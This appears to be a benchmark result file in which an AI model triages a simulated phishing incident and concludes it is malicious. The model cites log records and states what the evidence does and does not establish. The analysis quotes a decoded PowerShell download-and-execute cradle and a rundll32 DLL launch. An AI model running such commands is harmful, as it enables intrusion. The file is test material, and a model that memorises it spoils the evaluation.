@@ -1,0 +1,109 @@
+{
+ "scenario_id": "T023",
+ "condition": "C1",
+ "variant": "P2",
+ "backend": "openai:gpt-6.1-sol",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.98,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:44:40 UTC on WS-MLOPEZ-01, Word opened C:\\\\Users\\\\maria.lopez\\\\Downloads\\\\Statement.docm under maria.lopez. At 13:44:46, that Word process spawned PowerShell with -nop -w hidden -enc.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T023-00081\",\n        \"T023-00084\",\n        \"T023-00085\",\n        \"T023-00086\"\n      ]\n    },\n    {\n      \"claim\": \"The encoded PowerShell command decodes to IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/harbor-dental-it/tools/main/u.ps1'), instructing PowerShell to retrieve and execute remote script text.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T023-00085\",\n        \"T023-00086\"\n      ]\n    },\n    {\n      \"claim\": \"The script request returned HTTP 200. Its proxy tunnel ID PT-760fe1cf7e7c29f8 and client source port 55925 connect the inspected GET to PowerShell PID 3348 through endpoint network records. Attribution therefore does not depend on the separate browser-user-agent CONNECT record.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T023-00087\",\n        \"T023-00088\",\n        \"T023-00089\",\n        \"T023-00091\",\n        \"T023-00095\"\n      ]\n    },\n    {\n      \"claim\": \"At 13:44:48 UTC, the same PowerShell process spawned rundll32.exe with C:\\\\Users\\\\maria.lopez\\\\AppData\\\\Roaming\\\\svchelper.dll,Init as its argument. This establishes a subsequent DLL-execution attempt, not successful execution of the DLL's contents.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T023-00096\",\n        \"T023-00097\"\n      ]\n    },\n    {\n      \"claim\": \"The document-to-hidden-encoded-PowerShell chain, corroborated remote script retrieval, and subsequent rundll32 invocation support a malicious-activity finding for the reported workstation PowerShell activity. The recorded command and ancestry differ from the supplied approved patching practice; an organization-like repository name does not establish authorization.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\n        \"T023-00081\",\n        \"T023-00085\",\n        \"T023-00089\",\n        \"T023-00096\"\n      ]\n    },\n    {\n      \"claim\": \"The suspicious PowerShell process terminated at 13:45:11 UTC, approximately 25 seconds after creation. Its timing is near, but not exactly at, the ticket's approximate 13:40 report.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T023-00085\",\n        \"T023-00103\",\n        \"T023-00104\"\n      ]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The HTTP 200 GET establishes successful retrieval at the HTTP level, but the supplied proxy record does not include the script response body (T023-00089).\",\n    \"The rundll32 process-creation records show the DLL invocation, but do not include a corresponding DLL-load result or payload behavior (T023-00096, T023-00097).\",\n    \"The recorded suspicious PowerShell launch was at 13:44:46 and requested a hidden window; the evidence does not conclusively identify it as the window the user saw around 13:40 (T023-00085).\"\n  ],\n  \"claims_not_established\": [\n    \"Whether Statement.docm used a macro, an exploit, or another document-triggered mechanism to launch PowerShell; parent-child attribution alone does not establish that mechanism (T023-00081, T023-00085).\",\n    \"The contents and provenance of u.ps1 and svchelper.dll, including whether the downloaded script created that DLL (T023-00089, T023-00096).\",\n    \"Successful DLL initialization, persistence, credential theft, lateral movement, or data exfiltration by this execution chain (T023-00085, T023-00089, T023-00096).\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Preserve and analyze Statement.docm and svchelper.dll, including hashes, signatures, document code, and file provenance.\",\n    \"Recover the historical u.ps1 response from proxy retention or endpoint artifacts; collect PowerShell script-block, module, and AMSI telemetry.\",\n    \"Collect DLL-load telemetry, endpoint memory and detection results, and subsequent process/network activity to determine payload execution and impact.\",\n    \"Confirm the user's approximate observation time and validate the document and script's authorization with IT.\"\n  ],\n  \"unrelated_findings\": [\n    \"Separate credential-use review: scheduled-task-launched PowerShell ran C:\\\\Scripts\\\\endpoint-inventory.ps1 as SYSTEM and used explicit svc-bkp credentials targeting PROXY-HD-01. This differs from the supplied backup-account role; no connection to the alerted document chain is established (T023-00165, T023-00168).\",\n    \"Separate software/service review: Citrix SelfService.exe executed, and Edge successfully requested Slack's client page. These are outside the supplied approved services; they do not decide this alert (T023-00173, T023-00174, T023-00176, T023-00180).\",\n    \"Separate configuration review: explorer.exe set maria.lopez's ProxyEnable value to 0 at 13:58:16. The record does not establish a connection to the alerted PowerShell process or actual proxy bypass (T023-00155).\"\n  ]\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 42931,
+    "output": 1397
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.98,
+  "supporting_observations": [
+   {
+    "claim": "At 13:44:40 UTC on WS-MLOPEZ-01, Word opened C:\\Users\\maria.lopez\\Downloads\\Statement.docm under maria.lopez. At 13:44:46, that Word process spawned PowerShell with -nop -w hidden -enc.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T023-00081",
+     "T023-00084",
+     "T023-00085",
+     "T023-00086"
+    ]
+   },
+   {
+    "claim": "The encoded PowerShell command decodes to IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/harbor-dental-it/tools/main/u.ps1'), instructing PowerShell to retrieve and execute remote script text.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T023-00085",
+     "T023-00086"
+    ]
+   },
+   {
+    "claim": "The script request returned HTTP 200. Its proxy tunnel ID PT-760fe1cf7e7c29f8 and client source port 55925 connect the inspected GET to PowerShell PID 3348 through endpoint network records. Attribution therefore does not depend on the separate browser-user-agent CONNECT record.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T023-00087",
+     "T023-00088",
+     "T023-00089",
+     "T023-00091",
+     "T023-00095"
+    ]
+   },
+   {
+    "claim": "At 13:44:48 UTC, the same PowerShell process spawned rundll32.exe with C:\\Users\\maria.lopez\\AppData\\Roaming\\svchelper.dll,Init as its argument. This establishes a subsequent DLL-execution attempt, not successful execution of the DLL's contents.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T023-00096",
+     "T023-00097"
+    ]
+   },
+   {
+    "claim": "The document-to-hidden-encoded-PowerShell chain, corroborated remote script retrieval, and subsequent rundll32 invocation support a malicious-activity finding for the reported workstation PowerShell activity. The recorded command and ancestry differ from the supplied approved patching practice; an organization-like repository name does not establish authorization.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T023-00081",
+     "T023-00085",
+     "T023-00089",
+     "T023-00096"
+    ]
+   },
+   {
+    "claim": "The suspicious PowerShell process terminated at 13:45:11 UTC, approximately 25 seconds after creation. Its timing is near, but not exactly at, the ticket's approximate 13:40 report.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T023-00085",
+     "T023-00103",
+     "T023-00104"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The HTTP 200 GET establishes successful retrieval at the HTTP level, but the supplied proxy record does not include the script response body (T023-00089).",
+   "The rundll32 process-creation records show the DLL invocation, but do not include a corresponding DLL-load result or payload behavior (T023-00096, T023-00097).",
+   "The recorded suspicious PowerShell launch was at 13:44:46 and requested a hidden window; the evidence does not conclusively identify it as the window the user saw around 13:40 (T023-00085)."
+  ],
+  "claims_not_established": [
+   "Whether Statement.docm used a macro, an exploit, or another document-triggered mechanism to launch PowerShell; parent-child attribution alone does not establish that mechanism (T023-00081, T023-00085).",
+   "The contents and provenance of u.ps1 and svchelper.dll, including whether the downloaded script created that DLL (T023-00089, T023-00096).",
+   "Successful DLL initialization, persistence, credential theft, lateral movement, or data exfiltration by this execution chain (T023-00085, T023-00089, T023-00096)."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Preserve and analyze Statement.docm and svchelper.dll, including hashes, signatures, document code, and file provenance.",
+   "Recover the historical u.ps1 response from proxy retention or endpoint artifacts; collect PowerShell script-block, module, and AMSI telemetry.",
+   "Collect DLL-load telemetry, endpoint memory and detection results, and subsequent process/network activity to determine payload execution and impact.",
+   "Confirm the user's approximate observation time and validate the document and script's authorization with IT."
+  ],
+  "unrelated_findings": [
+   "Separate credential-use review: scheduled-task-launched PowerShell ran C:\\Scripts\\endpoint-inventory.ps1 as SYSTEM and used explicit svc-bkp credentials targeting PROXY-HD-01. This differs from the supplied backup-account role; no connection to the alerted document chain is established (T023-00165, T023-00168).",
+   "Separate software/service review: Citrix SelfService.exe executed, and Edge successfully requested Slack's client page. These are outside the supplied approved services; they do not decide this alert (T023-00173, T023-00174, T023-00176, T023-00180).",
+   "Separate configuration review: explorer.exe set maria.lopez's ProxyEnable value to 0 at 13:58:16. The record does not establish a connection to the alerted PowerShell process or actual proxy bypass (T023-00155)."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 20,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 20.2
+}
